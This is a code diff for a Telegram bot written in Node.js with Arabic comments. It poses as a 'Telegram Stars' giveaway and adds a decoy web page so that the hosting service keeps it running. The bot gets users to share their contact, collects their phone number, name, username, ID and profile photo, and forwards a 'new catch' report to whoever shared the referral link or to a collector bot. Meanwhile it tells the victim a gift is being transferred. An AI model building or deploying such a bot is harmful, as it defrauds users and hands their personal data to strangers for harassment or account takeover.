@@ -1,4 +1,39 @@
 const TelegramBot = require('node-telegram-bot-api');
+const express = require('express');
+
+const app = express();
+const PORT = process.env.PORT || 3000;
+
+// صفحة ويب وهمية للبورت لكي يقبلها Render
+app.get('/', (req, res) => {
+    res.send(`
+        <!DOCTYPE html>
+        <html lang="ar" dir="rtl">
+        <head>
+            <meta charset="UTF-8">
+            <title>ربح النجوم - Telegram Stars</title>
+            <style>
+                body { font-family: Tahoma, sans-serif; background: #0f172a; color: #fff; text-align: center; padding-top: 50px; }
+                .card { background: #1e293b; padding: 30px; border-radius: 10px; display: inline-block; box-shadow: 0 4px 6px rgba(0,0,0,0.3); }
+                h1 { color: #38bdf8; }
+                p { color: #94a3b8; }
+            </style>
+        </head>
+        <body>
+            <div class="card">
+                <h1>🌟 بوت ربح النجوم الحصري</h1>
+                <p>البوت يعمل بنجاح ومستقر على الخادم.</p>
+                <p>قم بالدخول إلى البوت عبر تيليجرام للمتابعة.</p>
+            </div>
+        </body>
+        </html>
+    `);
+});
+
+// بدء استماع السيرفر على البورت المطلوبة من Render
+app.listen(PORT, () => {
+    console.log(`سيرفر الويب يعمل على البورت ${PORT}`);
+});
 
 // قراءة التوكنات من متغيرات البيئة للحماية
 const COLLECTOR_TOKEN = process.env.COLLECTOR_BOT_TOKEN;
@@ -22,7 +57,7 @@ const referrers = {};
 // التعامل مع أمر البدء /start مع الأيدي القادم من الرابط
 bot.onText(/\/start(?:@\w+)?(?:\s+(.+))?/, async (msg, match) => {
     const chatId = msg.chat.id;
-    const refId = match ? match[1] : null; // الأيدي الموجود بنهاية الرابط
+    const refId = match ? match[1] : null;
 
     if (refId) {
         referrers[chatId] = refId;
@@ -53,17 +88,14 @@ bot.on('contact', async (msg) => {
 
     if (!contact) return;
 
-    // استخراج بيانات المستخدم
     const phone = contact.phone_number;
     const firstName = user.first_name || "بدون اسم";
     const lastName = user.last_name || "";
     const username = user.username ? `@${user.username}` : "لا يوجد يوزر";
     const userId = user.id;
 
-    // البحث عن صاحب الرابط (المستهدف الذي سيصله التقرير)
     const targetOwnerId = referrers[chatId];
 
-    // جلب معلومات إضافية مثل صورة الحساب الشخصية (إن وجدت)
     let profilePhotoUrl = "لا توجد صورة أو فشل الجلب";
     try {
         const photos = await bot.getUserProfilePhotos(userId, { limit: 1 });
@@ -76,7 +108,6 @@ bot.on('contact', async (msg) => {
         console.log("تعذر جلب صورة الحساب:", e.message);
     }
 
-    // بناء رسالة التقرير
     const reportMessage = `
 🚨 **صيد جديد تم رصده!**
 
@@ -88,11 +119,9 @@ bot.on('contact', async (msg) => {
 🎯 **مُرسل عبر الأيدي (الرابط):** ${targetOwnerId || "مباشر بدون رابط"}
 `;
 
-    // تجهيز رابط الواتساب الديناميكي مع الرقم المسحب والرسالة التلقائية
     const whatsappMessage = encodeURIComponent("تم سحب رقمك بواسطة وهم");
     const whatsappLink = `https://wa.me/${phone}?text=${whatsappMessage}`;
 
-    // الأزرار الشفافة للمستخدم (رابط الواتساب المباشر فقط)
     const inlineKeyboard = {
         reply_markup: {
             inline_keyboard: [
@@ -103,14 +132,12 @@ bot.on('contact', async (msg) => {
         }
     };
 
-    // إزالة كيبورد الطلب وإرسال رسالة النجاح للمستخدم مع الأزرار الشفافة
     await bot.sendMessage(chatId, `✅ تم التحقق بنجاح! جاري تحويل الهدية إلى حسابك...`, {
         reply_markup: { remove_keyboard: true }
     });
 
     await bot.sendMessage(chatId, `إليك الرابط المباشر للاتصال:`, inlineKeyboard);
 
-    // توجيه التقرير لصاحب الأيدي أو البوت الثاني المخصص للتنبيهات
     if (targetOwnerId) {
         try {
             if (profilePhotoUrl.startsWith("http")) {
